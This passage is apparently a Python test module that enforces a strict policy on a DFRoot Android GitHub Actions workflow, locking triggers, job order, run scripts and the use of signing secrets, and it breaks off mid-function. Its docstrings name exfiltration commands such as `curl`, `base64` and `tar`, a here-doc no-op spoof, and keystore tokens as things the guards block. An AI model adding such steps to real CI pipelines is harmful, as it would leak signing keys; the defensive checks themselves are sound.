RELEASE_UPLOAD_PATH = (
    "release/DFRoot_*.apk\n"
    "release/DFRoot_*.apk.sha256\n"
    "release/LICENSE\n"
    "release/GPL-3.0.txt\n"
    "release/NOTICE\n"
    "release/THIRD_PARTY_NOTICES.md"
)
PUBLISH_FILES = (
    "dist/DFRoot_*.apk\n"
    "dist/DFRoot_*.apk.sha256\n"
    "dist/LICENSE\n"
    "dist/GPL-3.0.txt\n"
    "dist/NOTICE\n"
    "dist/THIRD_PARTY_NOTICES.md"
)
# The fourth upload is informational provenance, never a release asset.  It is
# a single generated file under runner.temp, not an APK or signing material.
PROVENANCE_UPLOAD_PATH = "${{ runner.temp }}/dfroot-apk-provenance.txt"
UPLOAD_ARTIFACT_NAMES = {
    "build-lkms": ("df-lkm-${{ matrix.kmi }}",),
    "build-dfroot": (CI_EVIDENCE_ARTIFACT_NAME,),
    "build-release": (RELEASE_ARTIFACT_NAME, PROVENANCE_ARTIFACT_NAME),
}
LKM_UPLOAD_PATH = "out/dfroot-${{ matrix.kmi }}.ko"
FORBIDDEN_ARTIFACT_TOKENS = ("keystore", "signing", ".jks", "..")
EXPR_RE = re.compile(r"\$\{\{.*?\}\}")
BLOCK_HEADER_RE = re.compile(
    r"^(?P<indent> *)(?:- +)?(?P<key>[A-Za-z0-9_-]+):[ ]*(?P<style>[|>])[+-]?[ ]*(?:#.*)?$"
)


# --------------------------------------------------------------------------- #
# Strict, block-scalar-aware YAML subset parser
# --------------------------------------------------------------------------- #
def block_scalar_spans(text: str) -> list[tuple[int, int, int, str]]:
    """Return (header_indent, header_line, end_line_exclusive, key) per block scalar."""
    lines = text.splitlines()
    spans: list[tuple[int, int, int, str]] = []
    index = 0
    while index < len(lines):
        match = BLOCK_HEADER_RE.match(lines[index])
        if not match:
            index += 1
            continue
        indent = len(match.group("indent"))
        end = index + 1
        while end < len(lines):
            line = lines[end]
            if not line.strip():
                end += 1
                continue
            if len(line) - len(line.lstrip(" ")) <= indent:
                break
            end += 1
        spans.append((indent, index, end, match.group("key")))
        index = end
    return spans


def block_scalar_content_lines(text: str) -> set[int]:
    content: set[int] = set()
    for _indent, start, end, _key in block_scalar_spans(text):
        content.update(range(start + 1, end))
    return content


def strip_line_comment(line: str) -> str:
    """Strip a YAML comment from one line, honouring that line's quotes only."""
    output: list[str] = []
    quote: str | None = None
    index = 0
    while index < len(line):
        char = line[index]
        if quote == '"' and char == "\\":
            output.append(char)
            if index + 1 < len(line):
                output.append(line[index + 1])
                index += 2
            else:
                index += 1
            continue
        if quote:
            output.append(char)
            if char == quote:
                if quote == "'" and index + 1 < len(line) and line[index + 1] == "'":
                    output.append(line[index + 1])
                    index += 2
                    continue
                quote = None
        elif char in ("'", '"'):
            quote = char
            output.append(char)
        elif char == "#" and (index == 0 or line[index - 1].isspace()):
            break
        else:
            output.append(char)
        index += 1
    return "".join(output)


def strip_yaml_comments(text: str) -> str:
    """Remove YAML comments without touching block-scalar (shell) content."""
    lines = text.splitlines()
    content = block_scalar_content_lines(text)
    return "\n".join(
        line if index in content else strip_line_comment(line)
        for index, line in enumerate(lines)
    )


def strict_violations(text: str) -> list[str]:
    """Return every construct outside the allowed block-style YAML subset."""
    lines = text.splitlines()
    content = block_scalar_content_lines(text)
    violations: list[str] = []

    for index, line in enumerate(lines):
        if index in content:
            continue  # Block-scalar bodies are opaque shell/literal text.
        probe = EXPR_RE.sub("", strip_line_comment(line))
        if not probe.strip():
            continue
        number = index + 1
        if re.match(r"^\s*[\"'][^\"']+[\"']\s*:", probe):
            violations.append(f"line {number}: quoted YAML key")
        if any(char in probe for char in "{}[]"):
            violations.append(f"line {number}: flow-style mapping/sequence")
        if re.match(r"^\s*<<\s*:", probe):
            violations.append(f"line {number}: YAML merge key")
        mapping = re.match(r"^\s*(?:-\s+)?(?P<key>[A-Za-z0-9_-]+):(?P<rest>.*)$", probe)
        if mapping:
            value = mapping.group("rest").strip()
        else:
            item = re.match(r"^\s*-\s+(?P<rest>.*)$", probe)
            value = item.group("rest").strip() if item else ""
        if re.match(r"^&[A-Za-z0-9_]", value):
            violations.append(f"line {number}: YAML anchor")
        if re.match(r"^\*[A-Za-z0-9_]", value):
            violations.append(f"line {number}: YAML alias")
        if value.startswith("!"):
            violations.append(f"line {number}: YAML tag")

    # Here-docs in run scripts can hide no-op commands from line-based checks.
    # Bash here-*strings* (`<<<`) are not here-docs and are used to feed loops,
    # so they are explicitly excluded.  The single here-doc in the workflow is
    # the JUnit XML assertion: its entire script is equality-locked in
    # DFROOT_RUN_SCRIPTS, so a command cannot be hidden inside it.  Any *other*
    # here-doc (e.g. a `cat <<'NOOP'` spoof injected into a required step) is
    # still a hard error.
    heredoc_re = re.compile(r"(?<!<)<<(?!<)")
    for _indent, start, end, key in block_scalar_spans(text):
        if key != "run":
            continue
        body_lines = [line[_indent + 2:] if line.strip() else "" for line in lines[start + 1:end]]
        body = "\n".join(body_lines).strip()
        if body == HOST_GATES_RUN_SCRIPTS[JUNIT_STEP]:
            continue
        for index in range(start + 1, end):
            if heredoc_re.search(lines[index]):
                violations.append(f"line {index + 1}: heredoc in run script")
    return violations


def assert_strict_yaml(text: str) -> None:
    violations = strict_violations(text)
    if violations:
        raise AssertionError("strict YAML allowlist violation(s): " + "; ".join(violations))


# --------------------------------------------------------------------------- #
# Small helpers over the parsed subset
# --------------------------------------------------------------------------- #
def scalar(value: str) -> str:
    value = value.strip()
    if len(value) >= 2 and value[0] == value[-1] == "'":
        return value[1:-1].replace("''", "'")
    if len(value) >= 2 and value[0] == value[-1] == '"':
        return value[1:-1]
    return value


def property_value(block: str, key: str, indent: int) -> str | None:
    pattern = rf"^ {{{indent}}}{re.escape(key)}:\s*(.*?)\s*$"
    match = re.search(pattern, block, re.MULTILINE)
    return scalar(match.group(1)) if match else None


def mapping(block: str, key: str, indent: int) -> dict[str, str]:
    header = re.search(rf"^ {{{indent}}}{re.escape(key)}:\s*$", block, re.MULTILINE)
    if not header:
        return {}
    values: dict[str, str] = {}
    lines = block[header.end():].splitlines()
    child_indent = indent + 2
    pattern = rf"^ {{{child_indent}}}([A-Za-z0-9_-]+):\s*(.*?)\s*$"
    index = 0
    while index < len(lines):
        line = lines[index]
        if not line.strip():
            index += 1
            continue
        current_indent = len(line) - len(line.lstrip(" "))
        if current_indent < child_indent:
            break
        match = re.match(pattern, line) if current_indent == child_indent else None
        if not match:
            index += 1
            continue
        name, value = match.groups()
        index += 1
        if value in ("|", "|-", "|+", ">", ">-", ">+"):
            content: list[str] = []
            while index < len(lines):
                continuation = lines[index]
                continuation_indent = len(continuation) - len(continuation.lstrip(" "))
                if continuation.strip() and continuation_indent <= child_indent:
                    break
                content.append(continuation[child_indent + 2:] if continuation.strip() else "")
                index += 1
            values[name] = "\n".join(content).strip()
        else:
            values[name] = scalar(value)
    return values


def parse_triggers(text: str) -> dict[str, object]:
    """Parse the top-level `on:` block into a closed, comparable structure.

    Only the exact block-style subset the workflow is allowed to use is
    accepted; anything else is a hard error rather than being silently ignored.
    """
    lines = strip_yaml_comments(text).splitlines()
    start = next((i for i, line in enumerate(lines) if re.match(r"^on:\s*$", line)), None)
    if start is None:
        raise AssertionError("workflow has no top-level on: block")
    triggers: dict[str, object] = {}
    index = start + 1
    while index < len(lines):
        line = lines[index]
        if not line.strip():
            index += 1
            continue
        indent = len(line) - len(line.lstrip(" "))
        if indent == 0:
            break
        if indent != 2:
            raise AssertionError(f"unexpected indentation in on: block: {line!r}")
        header = re.match(r"^  (?P<key>[A-Za-z0-9_-]+):\s*(?P<value>.*?)\s*$", line)
        if not header:
            raise AssertionError(f"unexpected line in on: block: {line!r}")
        key, value = header.group("key"), header.group("value")
        index += 1
        if value:
            triggers[key] = scalar(value)
            continue
        members: dict[str, list[str]] = {}
        while index < len(lines):
            sub = lines[index]
            if not sub.strip():
                index += 1
                continue
            sub_indent = len(sub) - len(sub.lstrip(" "))
            if sub_indent <= 2:
                break
            if sub_indent != 4:
                raise AssertionError(f"unexpected indentation in on.{key}: {sub!r}")
            sub_header = re.match(r"^    (?P<key>[A-Za-z0-9_-]+):\s*(?P<value>.*?)\s*$", sub)
            if not sub_header or sub_header.group("value"):
                raise AssertionError(f"unexpected line in on.{key}: {sub!r}")
            list_key = sub_header.group("key")
            index += 1
            items: list[str] = []
            while index < len(lines):
                item = lines[index]
                if not item.strip():
                    index += 1
                    continue
                item_indent = len(item) - len(item.lstrip(" "))
                if item_indent <= 4:
                    break
                if item_indent != 6:
                    raise AssertionError(
                        f"unexpected indentation in on.{key}.{list_key}: {item!r}"
                    )
                item_match = re.match(r"^      -\s+(?P<value>.*?)\s*$", item)
                if not item_match:
                    raise AssertionError(
                        f"unexpected list item in on.{key}.{list_key}: {item!r}"
                    )
                items.append(scalar(item_match.group("value")))
                index += 1
            members[list_key] = items
        triggers[key] = members
    return triggers


def job_blocks(active: str) -> dict[str, str]:
    jobs_header = re.search(r"^jobs:\s*$", active, re.MULTILINE)
    if not jobs_header:
        raise AssertionError("workflow has no jobs mapping")
    headings = list(re.finditer(r"^  ([A-Za-z0-9_-]+):\s*$", active[jobs_header.end():], re.MULTILINE))
    jobs: dict[str, str] = {}
    for index, heading in enumerate(headings):
        start = jobs_header.end() + heading.end()
        end = jobs_header.end() + headings[index + 1].start() if index + 1 < len(headings) else len(active)
        jobs[heading.group(1)] = active[start:end]
    return jobs


def steps(block: str) -> list[str]:
    header = re.search(r"^    steps:\s*$", block, re.MULTILINE)
    if not header:
        return []
    result: list[str] = []
    current: list[str] = []
    for line in block[header.end():].splitlines():
        if re.match(r"^      - ", line):
            if current:
                result.append("\n".join(current))
            current = [line]
        elif current:
            current.append(line)
            if line and not line.startswith("      "):
                # A subsequent job key ends the steps sequence.
                result.append("\n".join(current))
                current = []
    if current:
        result.append("\n".join(current))
    return result


def step_property(step: str, key: str) -> str | None:
    normalized = re.sub(r"^      - ", "        ", step, count=1, flags=re.MULTILINE)
    pattern = rf"^        {re.escape(key)}:\s*(.*?)\s*$"
    match = re.search(pattern, normalized, re.MULTILINE)
    return scalar(match.group(1)) if match else None


def run_script(step: str) -> str:
    header = re.search(r"^        run:\s*[|>][-+]?\s*$", step, re.MULTILINE)
    if not header:
        return step_property(step, "run") or ""
    lines: list[str] = []
    for line in step[header.end():].splitlines():
        if line.strip() and not line.startswith("          "):
            break
        lines.append(line[10:] if line.startswith("          ") else "")
    return "\n".join(lines).strip()


def active_script_lines(script: str) -> list[str]:
    """Shell lines that actually execute (blank lines and # comments removed)."""
    return [
        line.strip()
        for line in script.splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]


def action_steps(job: str, action: str) -> list[str]:
    return [step for step in steps(job) if (step_property(step, "uses") or "").startswith(action + "@")]


def named_step(block: str, name: str) -> str:
    matches = [step for step in steps(block) if step_property(step, "name") == name]
    if len(matches) != 1:
        raise AssertionError(f"expected exactly one step named {name!r}, found {len(matches)}")
    return matches[0]


# --------------------------------------------------------------------------- #
# Global, mutation-resistant assertions (each accepts arbitrary workflow text)
# --------------------------------------------------------------------------- #
def assert_exact_triggers(text: str) -> None:
    """Lock the top-level event allowlist; no new/wider trigger may slip in."""
    triggers = parse_triggers(text)
    if "pull_request_target" in triggers:
        raise AssertionError("pull_request_target must not be a workflow trigger")
    if triggers != EXPECTED_TRIGGERS:
        raise AssertionError(
            f"top-level on: triggers must be exactly {EXPECTED_TRIGGERS!r}, got {triggers!r}"
        )


def assert_ddk_image_digest(text: str) -> None:
    """The build-lkms container image must carry the exact pinned digest."""
    job = job_blocks(strip_yaml_comments(text))["build-lkms"]
    image = mapping(job, "container", 4).get("image", "")
    match = re.search(r"@sha256:([0-9a-f]{64})$", image)
    if not match or match.group(1) != DDK_IMAGE_DIGEST:
        raise AssertionError(
            f"DDK image digest must be exactly {DDK_IMAGE_DIGEST}, got {image!r}"
        )


def assert_no_continue_on_error(text: str) -> None:
    # Any occurrence of the key is forbidden, regardless of its value:
    # `continue-on-error: false`, `${{ true }}`, empty values, etc.  A tolerated
    # step is unsafe even when the value looks harmless today, because a later
    # one-line edit can flip it without touching any other policy check.
    content_lines = block_scalar_content_lines(text)
    for index, line in enumerate(text.splitlines()):
        if index in content_lines:
            continue  # Shell text inside run scripts is not workflow YAML.
        probe = strip_line_comment(line)
        if re.match(r"^\s*continue-on-error\s*:", probe, re.IGNORECASE):
            raise AssertionError(f"line {index + 1}: continue-on-error is not allowed")


def assert_no_secrets_bypass(text: str) -> None:
    # Remove the four exact allowed expressions; anything else mentioning the
    # secrets context (bare `secrets`, `toJSON(secrets)`, `secrets['X']`,
    # different spacing, a token inside a shell comment, ...) is a hard error.
    remaining = text
    for expression in sorted(ALLOWED_SECRETS):
        remaining = remaining.replace(expression, "")
    # The CI scope report is a verbatim-equality-locked script whose user-facing
    # text says "no signing secrets".  Remove that exact pinned text only: any
    # *other* secrets token (including an inline comment or a compact
    # `${{secrets.X}}`) is still a hard error.
    pinned_scope = "\n".join(
        "          " + line if line else "" for line in DFROOT_RUN_SCRIPTS[CI_SCOPE_STEP].splitlines()
    )
    remaining = remaining.replace(pinned_scope, "")
    stray = re.findall(r"\bsecrets\b", remaining, re.IGNORECASE)
    if stray:
        raise AssertionError(f"unexpected secrets context token(s): {stray}")

    active = strip_yaml_comments(text)
    job = job_blocks(active)["build-release"]
    signing = [step for step in steps(job) if step_property(step, "name") == "Write signing material"]
    if len(signing) != 1:
        raise AssertionError("expected exactly one Write signing material step")
    signing_text = signing[0]
    expected_env = {"${{ secrets." + name + " }}" for name in SIGNING_SECRETS}
    if set(mapping(signing_text, "env", 8).values()) != expected_env:
        raise AssertionError("signing env must contain exactly the four allowed secret expressions")
    for expression in sorted(ALLOWED_SECRETS):
        if text.count(expression) != 1 or expression not in signing_text:
            raise AssertionError(f"{expression} must appear exactly once, in Write signing material")


def assert_exact_test_ci_commands(text: str) -> None:
    active = strip_yaml_comments(text)
    job = job_blocks(active)["test-ci"]
    if property_value(job, "if", 4) is not None:
        raise AssertionError("test-ci must not be conditionally skipped")
    for name, command in TEST_CI_COMMANDS.items():
        matches = [step for step in steps(job) if step_property(step, "name") == name]
        if len(matches) != 1:
            raise AssertionError(f"expected exactly one test-ci step named {name!r}")
        step = matches[0]
        if run_script(step) != command:
            raise AssertionError(f"{name} must be exactly: {command}")
        if step_property(step, "if") is not None or step_property(step, "continue-on-error") is not None:
            raise AssertionError(f"{name} must not be skippable or tolerated")


def assert_required_steps_unskippable(text: str) -> None:
    active = strip_yaml_comments(text)
    jobs = job_blocks(active)
    required = {
        "test-ci": list(TEST_CI_COMMANDS),
        HOST_GATES_JOB: [
            CHECKOUT_SHA_STEP,
            HOST_STATUS_STEP,
            KO_POLICY_TEST_STEP,
            PACKAGED_KO_TEST_STEP,
            APK_FIXTURE_TEST_STEP,
            EXTRACT_PINS_STEP,
            KO_CI_POLICY_STEP,
            JVM_TEST_STEP,
            JUNIT_STEP,
            ALL_MARKERS_STEP,
        ],
        "build-dfroot": [
            DEBUG_BUILD_STEP,
            CI_CACHE_ASSERT_STEP,
            APK_COUNTER_COMMAND,
            CI_SCOPE_STEP,
        ],
        "build-release": [
            ANCESTRY_STEP,
            "Write signing material",
            "Build signed release APK",
            "Verify signed release APK",
            "Package signed release APK",
            EXTRACT_PINS_STEP,
            PACKAGED_KO_GATE_STEP,
            APK_LOADER_GATE_STEP,
            PROVENANCE_IDENTITY_STEP,
            CI_CACHE_ASSERT_STEP,
            RELEASE_EVIDENCE_STEP,
            UPLOAD_CHOKE_STEP,
        ],
        "publish": ["Verify release checksum"],
    }
    for job_name, names in required.items():
        for name in names:
            step = named_step(jobs[job_name], name)
            if step_property(step, "if") is not None or step_property(step, "continue-on-error") is not None:
                raise AssertionError(f"{job_name}/{name} must not be skippable or tolerated")


def assert_exact_command_lines(text: str) -> None:
    active = strip_yaml_comments(text)
    jobs = job_blocks(active)
    verify = active_script_lines(run_script(named_step(jobs["build-release"], "Verify signed release APK")))
    for command in (
        'apksigner=$(find "$sdk/build-tools" -mindepth 2 -maxdepth 2 -type f -name apksigner -print | sort -V | tail -n 1)',
        '"$apksigner" verify --verbose --print-certs "${apks[0]}"',
    ):
        if command not in verify:
            raise AssertionError(f"missing exact active apksigner command line: {command}")
    package = active_script_lines(run_script(named_step(jobs["build-release"], "Package signed release APK")))
    if 'sha256sum -- "$apk" > "$apk.sha256"' not in package:
        raise AssertionError("missing exact active package sha256sum command line")
    publisher_script = run_script(named_step(jobs["publish"], "Verify release checksum"))
    if publisher_script != VERIFY_CHECKSUM_SCRIPT:
        raise AssertionError(
            f"publisher run script must be exactly {VERIFY_CHECKSUM_SCRIPT!r}, "
            f"got {publisher_script!r}"
        )
    publisher = active_script_lines(publisher_script)
    if 'sha256sum --check "$checksum"' not in publisher:
        raise AssertionError("missing exact active publisher sha256sum command line")
    counter = active_script_lines(run_script(named_step(jobs["build-dfroot"], APK_COUNTER_COMMAND)))
    for command in (
        "shopt -s nullglob",
        "debug=(app/build/outputs/apk/debug/DFRoot_*.apk)",
        "if [[ ${#debug[@]} -ne 1 ]]; then",
    ):
        if command not in counter:
            raise AssertionError(f"missing exact active APK count command line: {command}")
    if any("release=" in line for line in counter):
        raise AssertionError("the PR CI APK counter must not count a release APK")
    if not any("Expected exactly one debug APK" in line for line in counter):
        raise AssertionError("missing exact APK counter failure message")


def assert_exact_step_names(text: str) -> None:
    """Every job must have exactly its allowlisted steps, in that order."""
    jobs = job_blocks(strip_yaml_comments(text))
    if set(jobs) != set(JOB_STEP_NAMES):
        raise AssertionError(
            f"job set must be exactly {sorted(JOB_STEP_NAMES)}, got {sorted(jobs)}"
        )
    for job_name, expected in JOB_STEP_NAMES.items():
        actual = [step_property(step, "name") for step in steps(jobs[job_name])]
        if actual != expected:
            raise AssertionError(
                f"{job_name} step names must be exactly {expected!r}, got {actual!r}"
            )


def assert_exact_release_run_scripts(text: str) -> None:
    """Lock every build-release run script, in order, to its exact text.

    No step is exempt: cleanup is compared with equality just like the rest.
    This is deliberately stronger than a substring/`in` check, so appending an
    exfiltration command (`cat`, `base64`, `curl`, `tar`), a tolerated failure
    (`|| true`), or replacing the ancestry command with a no-op `echo` cannot
    slip through.
    """
    job = job_blocks(strip_yaml_comments(text))["build-release"]
    job_steps = steps(job)
    # Detect run steps by the presence of the `run:` key, not by a non-empty
    # script, so an added (even empty) run key is still caught by the lock.
    run_steps = [step for step in job_steps if step_property(step, "run") is not None]
    actual_names = [step_property(step, "name") for step in run_steps]
    expected_names = list(RELEASE_RUN_SCRIPTS)
    if actual_names != expected_names:
        raise AssertionError(
            f"build-release run steps must be exactly {expected_names!r}, got {actual_names!r}"
        )
    for name, step in zip(expected_names, run_steps):
        expected = RELEASE_RUN_SCRIPTS[name]
        actual = run_script(step)
        if actual != expected:
            raise AssertionError(
                f"build-release/{name} run script must be exactly {expected!r}, got {actual!r}"
            )


def assert_exact_dfroot_run_scripts(text: str) -> None:
    """Lock every build-dfroot compile/content-gate run script to exact text."""
    job = job_blocks(strip_yaml_comments(text))["build-dfroot"]
    run_steps = [step for step in steps(job) if step_property(step, "run") is not None]
    actual_names = [step_property(step, "name") for step in run_steps]
    expected_names = list(DFROOT_RUN_SCRIPTS)
    if actual_names != expected_names:
        raise AssertionError(
            f"build-dfroot run steps must be exactly {expected_names!r}, got {actual_names!r}"
        )
    for name, step in zip(expected_names, run_steps):
        if run_script(step) != DFROOT_RUN_SCRIPTS[name]:
            raise AssertionError(
                f"build-dfroot/{name} run script must be exactly "
                f"{DFROOT_RUN_SCRIPTS[name]!r}, got {run_script(step)!r}"
            )


def assert_exact_host_gates_run_scripts(text: str) -> None:
    """Lock every host-gates run script, including the checkout-SHA assertion."""
    job = job_blocks(strip_yaml_comments(text))[HOST_GATES_JOB]
    run_steps = [step for step in steps(job) if step_property(step, "run") is not None]
    actual_names = [step_property(step, "name") for step in run_steps]
    expected_names = list(HOST_GATES_RUN_SCRIPTS)
    if actual_names != expected_names:
        raise AssertionError(
            f"host-gates run steps must be exactly {expected_names!r}, got {actual_names!r}"
        )
    for name, step in zip(expected_names, run_steps):
        if run_script(step) != HOST_GATES_RUN_SCRIPTS[name]:
            raise AssertionError(
                f"host-gates/{name} run script must be exactly "
                f"{HOST_GATES_RUN_SCRIPTS[name]!r}, got {run_script(step)!r}"
            )


def assert_job_graph(text: str) -> None:
    """Host evidence gates are unconditional and required by both build paths."""
    active = strip_yaml_comments(text)
    jobs = job_blocks(active)
    expected_order = [
        "test-ci", "build-lkms", HOST_GATES_JOB,
        "build-dfroot", "build-release", "publish",
    ]
    if list(jobs) != expected_order:
        raise AssertionError(f"job graph order must be exactly {expected_order!r}, got {list(jobs)!r}")
    expected_needs = {
        "test-ci": None,
        "build-lkms": "test-ci",
        HOST_GATES_JOB: "build-lkms",
        "build-dfroot": HOST_GATES_JOB,
        "build-release": HOST_GATES_JOB,
        "publish": "build-release",
    }
    for name, needed in expected_needs.items():
        actual = property_value(jobs[name], "needs", 4)
        if actual != needed:
            raise AssertionError(f"{name} needs must be {needed!r}, got {actual!r}")
    host = jobs[HOST_GATES_JOB]
    if property_value(host, "if", 4) is not None:
        raise AssertionError("host-gates must be unconditional (no if:)")
    if mapping(host, "permissions", 4) != {"contents": "read"}:
        raise AssertionError("host-gates permissions must be exactly contents: read")
    if property_value(host, "timeout-minutes", 4) is None:
        raise AssertionError("host-gates must declare a timeout-minutes")
    if property_value(jobs["build-dfroot"], "if", 4) != "${{ !(" + TAG_PUSH + ") }}":
        raise AssertionError("build-dfroot must keep its non-tag-only guard")
    for job_name in ("build-release", "publish"):
        if property_value(jobs[job_name], "if", 4) != "${{ " + TAG_PUSH + " }}":
            raise AssertionError(f"{job_name} must keep its tag-only guard")


def assert_six_cmake_suites(text: str) -> None:
    """All six host CMake suites must run in host-gates, none in build-dfroot."""
    jobs = job_blocks(strip_yaml_comments(text))
    host_scripts = "\n".join(run_script(step) for step in steps(jobs[HOST_GATES_JOB]))
    suites = set(re.findall(r"tests/cmake/[A-Za-z0-9_]+\.cmake", host_scripts))
    expected = {
        "tests/cmake/ko_hash_policy_test.cmake",
        "tests/cmake/packaged_ko_test.cmake",
        "tests/cmake/packaging_target_graph_test.cmake",
        "tests/cmake/apk_packaging_gate_test.cmake",
        "tests/cmake/apk_content_gate_test.cmake",
        "tests/cmake/loader_hash_test.cmake",
    }
    if suites != expected:
        raise AssertionError(
            f"host-gates must run exactly the six CMake suites {sorted(expected)!r}, "
            f"got {sorted(suites)!r}"
        )
    ci_scripts = "\n".join(run_script(step) for step in steps(jobs["build-dfroot"]))
    for suite in expected:
        if suite in ci_scripts:
            raise AssertionError(f"{suite} must not be duplicated in build-dfroot")


def assert_ci_evidence_upload_has_no_apk(text: str) -> None:
    """PR/branch/manual uploads are licence evidence only: never an APK."""
    job = job_blocks(strip_yaml_comments(text))["build-dfroot"]
    uploads = action_steps(job, "actions/upload-artifact")
    if len(uploads) != 1:
        raise AssertionError("build-dfroot must have exactly one upload step")
    inputs = mapping(uploads[0], "with", 8)
    if inputs.get("name") != CI_EVIDENCE_ARTIFACT_NAME:
        raise AssertionError(
            f"CI upload artifact must be {CI_EVIDENCE_ARTIFACT_NAME!r}, "
            f"got {inputs.get('name')!r}"
        )
    path = inputs.get("path") or ""
    if ".apk" in path.lower() or ".apk" in (inputs.get("name") or "").lower():
        raise AssertionError("CI evidence upload must not include any APK path")
    if "app/build/outputs" in path:
        raise AssertionError("CI evidence upload must not include build output paths")
    if path != CI_EVIDENCE_UPLOAD_PATH:
        raise AssertionError(f"CI evidence upload path must be exactly {CI_EVIDENCE_UPLOAD_PATH!r}")


def assert_smoke_identity(gradle: str, smoke: str) -> None:
    """The signing smoke must use an isolated identity and reject DFRoot APKs."""
    for fragment in (
        'applicationId = if (signingSmokeSkipNative) "df.root.signingsmoke" else "df.root"',
        'versionName = if (signingSmokeSkipNative) "4.8-gzif-signingsmoke" else "4.8-gzif"',
        'if (signingSmokeSkipNative) "SigningSmoke-${vn}.apk" else "DFRoot_${vn}.apk"',
    ):
        if fragment not in gradle:
            raise AssertionError(f"gradle signing-smoke identity is missing {fragment!r}")
    for fragment in (
        "SIGNED_APK=app/build/outputs/apk/release/SigningSmoke-4.8-gzif-signingsmoke.apk",
        "compgen -G 'app/build/outputs/apk/*/DFRoot_*.apk'",
        "ERROR: signing smoke produced a production-named DFRoot_*.apk.",
        "expected exactly the isolated signing-smoke APK",
        "if ./gradlew :app:clean :app:assembleRelease",
        "no release APK was produced",
    ):
        if fragment not in smoke:
            raise AssertionError(f"smoke script is missing {fragment!r}")
    if "SIGNED_APK=app/build/outputs/apk/release/DFRoot_" in smoke:
        raise AssertionError("smoke script still uses the production APK name")


def assert_loader_keep_debug_symbols(gradle: str) -> None:
    """Check the Gradle source contract for the two reviewed loader blobs.

    Both keepDebugSymbols exemptions must appear exactly once in the whole
    file and exactly once inside ``packaging { jniLibs { ... } }``, where the
    exemption is variant-independent.  This is a source-contract check only;
    it is not a substitute for the tag-time final-APK byte gate that hashes
    the extracted loader libraries.
    """
    block = re.search(r"packaging\s*\{\s*jniLibs\s*\{(?P<body>[^{}]*)\}\s*\}", gradle)
    if block is None:
        raise AssertionError("gradle is missing a packaging { jniLibs { ... } } block")
    body = block.group("body")
    for fragment in LOADER_KEEP_DEBUG_SYMBOLS_FRAGMENTS:
        whole_count = gradle.count(fragment)
        if whole_count != 1:
            raise AssertionError(
                f"{fragment!r} must appear exactly one time in gradle, got {whole_count}"
            )
        block_count = body.count(fragment)
        if block_count != 1:
            raise AssertionError(
                f"{fragment!r} must appear exactly one time inside packaging.jniLibs, got {block_count}"
            )


def assert_pr3_gates(text: str) -> None:
    """Focused assertions for the integrated PR #3 gates.

    The exact script locks above are the primary defence; these checks state
    the security intent explicitly (markers, skip rejection, per-APK evidence,
    choke point, no release claim on PR events) so that a re-ordering or a
    removed gate is caught with a readable failure even before equality checks.
    """
    jobs = job_blocks(strip_yaml_comments(text))
    host, ci, release = jobs[HOST_GATES_JOB], jobs["build-dfroot"], jobs["build-release"]
    ci_steps, release_steps = steps(ci), steps(release)

    # 1. Each of the seven host suites writes its own marker, unconditionally,
    # in host-gates. build-dfroot must not carry any host suite any more.
    for step in ci_steps:
        if step_property(step, "name") in HOST_GATES_RUN_SCRIPTS:
            raise AssertionError(f"build-dfroot must not repeat host-gates step {step_property(step, 'name')!r}")
    marker_steps = {
        HOST_STATUS_STEP: ("native-ok", "marker-native"),
        KO_POLICY_TEST_STEP: ("ko-policy-ok", "marker-ko-policy"),
        PACKAGED_KO_TEST_STEP: ("packaged-ko-ok", "marker-packaged-ko"),
        APK_FIXTURE_TEST_STEP: ("apk-packaging-fixture-ok", "marker-apk-packaging-fixture"),
        KO_CI_POLICY_STEP: ("ko-ci-policy-ok", "marker-ko-ci-policy"),
        JVM_TEST_STEP: ("jvm-ok", "marker-jvm"),
        JUNIT_STEP: ("junit-ok", "marker-junit"),
    }
    for name, (value, marker) in marker_steps.items():
        script = run_script(named_step(host, name))
        if f'echo "{value}" > "$RUNNER_TEMP/{marker}"' not in script:
            raise AssertionError(f"host-gates/{name} must write {marker}")
    # The target-graph harness shares the packaged-KO step and its one marker;
    # it must never become an eighth suite/marker.
    packaged_host = run_script(named_step(host, PACKAGED_KO_TEST_STEP))
    for fragment in ("tests/cmake/packaged_ko_test.cmake",
                     "tests/cmake/packaging_target_graph_test.cmake",
                     'echo "packaged-ko-ok" > "$RUNNER_TEMP/marker-packaged-ko"'):
        if fragment not in packaged_host:
            raise AssertionError(f"packaged-KO host step is missing {fragment!r}")
    apk_host = run_script(named_step(host, APK_FIXTURE_TEST_STEP))
    for fragment in ("tests/cmake/apk_packaging_gate_test.cmake",
                     "tests/cmake/apk_content_gate_test.cmake",
                     "tests/cmake/loader_hash_test.cmake",
                     'echo "apk-packaging-fixture-ok" > "$RUNNER_TEMP/marker-apk-packaging-fixture"'):
        if fragment not in apk_host:
            raise AssertionError(f"APK host step is missing {fragment!r}")
    # The real debug APK produced by AGP must contain the required bootstrap
    # library; a green Gradle exit code alone cannot prove its native contents.
    counter = run_script(named_step(ci, APK_COUNTER_COMMAND))
    for fragment in ("zipfile.ZipFile", "lib/arm64-v8a/libbootstrap.so",
                     'echo "::error::Debug APK is missing lib/arm64-v8a/libbootstrap.so"'):
        if fragment not in counter:
            raise AssertionError(f"debug APK counter is missing {fragment!r}")
    all_markers = run_script(named_step(host, ALL_MARKERS_STEP))
    if len(HOST_SUITE_MARKERS) != 7:
        raise AssertionError("internal: expected exactly seven host suite markers")
    if '-s "$RUNNER_TEMP/$marker"' not in all_markers:
        raise AssertionError("all-suites gate must check each marker with -s")
    for marker in HOST_SUITE_MARKERS:
        if marker not in all_markers:
            raise AssertionError(f"all-suites gate does not list {marker}")
    if "7/7 markers" not in all_markers:
        raise AssertionError("all-suites gate must state the 7/7 marker result")

    # 2. The JUnit assertion is strict: 39 tests, 0 failures/errors/skips.
    junit = run_script(named_step(host, JUNIT_STEP))
    if junit != HOST_GATES_RUN_SCRIPTS[JUNIT_STEP]:
        raise AssertionError("JUnit XML assertion script is not the pinned script")
    for fragment in (
        "TEST-*.xml",
        "if not files:",
        "tests != 39",
        "failures != 0",
        "errors != 0",
        "skipped != 0",
        "raise SystemExit",
    ):
        if fragment not in junit:
            raise AssertionError(f"JUnit XML assertion is missing {fragment!r}")

    # 3. CI-enforced KO policy: a positive verified run plus negative skip
    # checks that must fail under CI and for the release variant.
    ko_policy = run_script(named_step(host, KO_CI_POLICY_STEP))
    for fragment in (
        "CI=true cmake -DKO_FILE=",
        "if CI=true cmake",
        "-DDFROOT_SKIP=ON",
        "exit 1",
        "DFROOT_ANDROID_VARIANT=release",
        "marker-ko-ci-policy",
    ):
        if fragment not in ko_policy:
